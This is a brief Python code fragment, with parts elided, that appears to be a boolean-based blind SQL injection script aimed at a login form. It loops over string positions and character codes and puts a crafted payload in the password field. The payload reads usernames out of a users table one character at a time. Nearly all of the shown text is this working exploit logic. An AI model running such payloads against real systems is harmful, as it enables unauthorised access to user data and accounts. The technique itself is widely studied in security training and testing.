...
for pos in range(1,10):
    ...
    for i in range(48, 123):
        ...
        data = {
          'user': 'admin',
          'pass': '\' or ((select substr(username, '+ str(pos) +', 1) from users where lower(username) > \'\' and username = (select min(username) from users where lower(username) > \'john\')) = \'' + current_ch + '\') or \'1\'=\'2'
        }
